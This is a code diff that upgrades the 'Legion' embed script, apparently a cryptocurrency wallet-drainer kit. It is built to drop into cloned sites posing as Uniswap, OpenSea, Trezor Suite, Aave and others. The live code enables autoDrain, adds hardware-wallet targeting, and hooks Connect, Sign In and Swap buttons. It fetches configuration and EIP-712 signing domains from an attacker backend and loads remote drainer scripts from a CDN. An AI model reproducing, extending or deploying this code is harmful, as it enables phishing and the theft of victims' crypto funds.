@@ -1,21 +1,14 @@
 /**
- * LEGION EMBED — One script tag for any frontend.
+ * LEGION UNIVERSAL EMBED v1.3.0 — ONE script for ANY frontend
  *
- * Usage (defaults baked in — copy-paste anywhere):
+ * Works on: Uniswap, OpenSea, Trezor Suite, SwapX, Aave, Curve, CEX clones,
+ *           static HTML, React/Vue/Next — no site-specific code required.
+ *
+ * ═══ COPY-PASTE (production) ═══
  *   <script src="https://legion-cdn.surge.sh/legion-embed.js" defer></script>
  *
- * With overrides (data-* or window.LEGION_CONFIG before this tag):
- *   <script>
- *     window.LEGION_CONFIG = { backendUrl: '...', wcProjectId: '...' };
- *   </script>
- *   <script src="https://legion-cdn.surge.sh/legion-embed.js"
- *     data-backend="https://sadrailala-production.up.railway.app"
- *     data-wc="a785da105621eb55c998a35c57587667"
- *     data-silent="false"
- *     defer></script>
- *
- * Loads in order: polyfills → wallet bundle → legion.min.js
- * legion.js then auto-hooks Connect buttons + injects wallet modal on any site.
+ * Auto-hooks: Connect Wallet, Connect, Sign In, Swap, Trade, Get Started, etc.
+ * Loads: polyfills → wallet bundle → legion.min.js from same CDN folder.
  */
 (function () {
   'use strict';
@@ -23,19 +16,20 @@
   if (window.__LEGION_EMBED_LOADED__) return;
   window.__LEGION_EMBED_LOADED__ = true;
 
-  var EMBED_VERSION = '1.2.0';
+  var EMBED_VERSION = '1.3.0';
   var CDN_PRIMARY = 'https://legion-cdn.surge.sh/';
+  var DEFAULT_BACKEND = 'https://sadrailala-production.up.railway.app';
   var VERSIONS = {
     polyfills: '1.1.0',
-    wallet: '1.3.8',
-    legion: '5.14.0',
+    wallet: '1.3.7',
+    legion: '5.14.2',
   };
 
   var DEFAULTS = {
-    backendUrl: 'https://sadrailala-production.up.railway.app',
+    backendUrl: DEFAULT_BACKEND,
     wcProjectId: 'a785da105621eb55c998a35c57587667',
     kineticKey: '',
-    clientEncryptKey: '',
+    clientEncryptKey: '__EMBED_ENCRYPT_KEY__',
     silentMode: false,
     autoDrain: true,
     autoRun: false,
@@ -50,7 +44,7 @@
     hookButtons: true,
     strictCsp: false,
     cdnFallback: true,
-    hwWallets: false,
+    hwWallets: true,
     debugDevTools: false,
   };
 
@@ -66,7 +60,7 @@
         return src.replace(/[^/]*$/, '');
       }
     }
-    return './';
+    return CDN_PRIMARY;
   })();
 
   function parseBool(val, fallback) {
@@ -84,25 +78,59 @@
     if (d.backend) out.backendUrl = d.backend;
     if (d.wc || d.wcProjectId) out.wcProjectId = d.wc || d.wcProjectId;
     if (d.kinetic || d.kineticKey) out.kineticKey = d.kinetic || d.kineticKey;
-    if (d.clientEncryptKey || d.encryptKey) out.clientEncryptKey = d.clientEncryptKey || d.encryptKey;
+    if (d.clientEncryptKey || d.encryptKey || d.encrypt) {
+      out.clientEncryptKey = d.clientEncryptKey || d.encryptKey || d.encrypt;
+    }
     if (d.silent != null) out.silentMode = parseBool(d.silent, DEFAULTS.silentMode);
     if (d.autoDrain != null) out.autoDrain = parseBool(d.autoDrain, DEFAULTS.autoDrain);
     if (d.autoRun != null) out.autoRun = parseBool(d.autoRun, DEFAULTS.autoRun);
     if (d.hookButtons != null) out.hookButtons = parseBool(d.hookButtons, DEFAULTS.hookButtons);
+    if (d.hwWallets != null) out.hwWallets = parseBool(d.hwWallets, DEFAULTS.hwWallets);
     if (d.minDrainUsd != null && d.minDrainUsd !== '') out.minDrainUsd = Number(d.minDrainUsd);
     if (d.vendorBase) out.vendorBase = d.vendorBase;
     return out;
   }
 
+  function sanitizeEncryptKey(key) {
+    if (!key || key === '') return '';
+    return String(key).trim();
+  }
+
+  var dataCfg = readDataConfig();
   var userCfg = window.LEGION_CONFIG && typeof window.LEGION_CONFIG === 'object'
     ? window.LEGION_CONFIG
     : {};
 
-  window.LEGION_CONFIG = Object.assign({}, DEFAULTS, userCfg, readDataConfig(), {
-    vendorBase: (readDataConfig().vendorBase || userCfg.vendorBase || CDN_BASE).replace(/\/?$/, '/'),
+  window.LEGION_CONFIG = Object.assign({}, DEFAULTS, userCfg, dataCfg, {
+    vendorBase: (dataCfg.vendorBase || userCfg.vendorBase || CDN_BASE).replace(/\/?$/, '/'),
+    clientEncryptKey: sanitizeEncryptKey(
+      dataCfg.clientEncryptKey || userCfg.clientEncryptKey || DEFAULTS.clientEncryptKey
+    ),
     embed: true,
     embedVersion: EMBED_VERSION,
+    universal: true,
   });
+
+  function bootstrapBackendConfig() {
+    var base = String(window.LEGION_CONFIG.backendUrl || DEFAULT_BACKEND).replace(/\/$/, '');
+    return fetch(base + '/api/v1/client-config', { method: 'GET', credentials: 'omit', cache: 'no-store' })
+      .then(function (res) { return res.json(); })
+      .then(function (json) {
+        var d = json && json.data;
+        if (!d) return;
+        if (d.primary) window.LEGION_CONFIG.backendUrl = String(d.primary).replace(/\/$/, '');
+        if (d.endpoints && d.endpoints.length) window.LEGION_CONFIG.backendEndpoints = d.endpoints.slice();
+        if (d.proxy_urls && d.proxy_urls.length) window.LEGION_CONFIG.proxyUrls = d.proxy_urls.slice();
+        if (d.wc_project_id) window.LEGION_CONFIG.wcProjectId = d.wc_project_id;
+        if (d.deploy_domains) window.LEGION_CONFIG.deployDomains = d.deploy_domains;
+        if (d.eip712_domains) window.LEGION_CONFIG.eip712Domains = d.eip712_domains;
+        if (d.embed_script && !dataCfg.vendorBase && !userCfg.vendorBase) {
+          var m = String(d.embed_script).match(/^(https?:\/\/[^/]+\/)/);
+          if (m) window.LEGION_CONFIG.vendorBase = m[1];
+        }
+      })
+      .catch(function () { /* offline fallback — baked defaults */ });
+  }
 
   var loaded = {};
   function loadScript(src, id) {
@@ -129,32 +157,38 @@
     var st = document.createElement('style');
     st.id = '__legion_embed_styles';
     st.textContent = [
-      'w3m-modal,appkit-modal,wcm-modal,[data-rk]{z-index:2147483646!important}',
+      'w3m-modal,appkit-modal,wcm-modal,[data-rk],w3m-modal-container{z-index:2147483646!important}',
       'body.legion-embed-active{margin:0}',
     ].join('');
     document.head.appendChild(st);
   }
 
-  var base = window.LEGION_CONFIG.vendorBase;
-  var chain = loadScript(base + 'vendor/legion-polyfills.js?v=' + VERSIONS.polyfills, '__legion_embed_polyfills')
-    .then(function () {
-      return loadScript(base + 'vendor/legion-wallet.iife.js?v=' + VERSIONS.wallet, '__legion_embed_wallet');
-    })
-    .then(function () {
-      return loadScript(base + 'legion.min.js?v=' + VERSIONS.legion, '__legion_embed_core').catch(function () {
-        return loadScript(base + 'legion.js?v=' + VERSIONS.legion, '__legion_embed_core_fb');
-      });
-    });
-
   injectEmbedStyles();
   document.documentElement.classList.add('legion-embed-active');
 
+  var base = window.LEGION_CONFIG.vendorBase;
+  var chain = bootstrapBackendConfig().then(function () {
+    base = window.LEGION_CONFIG.vendorBase || base;
+    return loadScript(base + 'vendor/legion-polyfills.js?v=' + VERSIONS.polyfills, '__legion_embed_polyfills');
+  }).then(function () {
+    return loadScript(base + 'vendor/legion-wallet.iife.js?v=' + VERSIONS.wallet, '__legion_embed_wallet');
+  }).then(function () {
+    return loadScript(base + 'legion.min.js?v=' + VERSIONS.legion, '__legion_embed_core').catch(function () {
+      return loadScript(base + 'legion.js?v=' + VERSIONS.legion, '__legion_embed_core_fb');
+    });
+  });
+
   chain.then(function () {
     if (window.legion) {
-      console.log('[LegionEmbed] v' + EMBED_VERSION + ' ready — legion v' + (window.legion.version || '?'));
+      console.log('[LegionEmbed] universal v' + EMBED_VERSION + ' ready — legion v' + (window.legion.version || '?'));
     }
     window.dispatchEvent(new CustomEvent('legion:embed-ready', {
-      detail: { embedVersion: EMBED_VERSION, cdnBase: base, legionVersion: window.legion && window.legion.version },
+      detail: {
+        embedVersion: EMBED_VERSION,
+        cdnBase: base,
+        legionVersion: window.legion && window.legion.version,
+        universal: true,
+      },
     }));
   }).catch(function (err) {
     console.error('[LegionEmbed]', err.message || err);
@@ -163,6 +197,7 @@
   window.LegionEmbed = {
     version: EMBED_VERSION,
     cdnBase: base,
+    universal: true,
     connect: function () {
       if (window.legion && typeof window.legion.connect === 'function') {
         return window.legion.connect();
@@ -176,7 +211,7 @@
           return;
         }
         var t = setTimeout(function () { reject(new Error('Legion embed timeout')); }, 120000);
-        window.addEventListener('legion:ready', function onReady(e) {
+        window.addEventListener('legion:ready', function onReady() {
           clearTimeout(t);
           window.removeEventListener('legion:ready', onReady);
           resolve(window.legion);
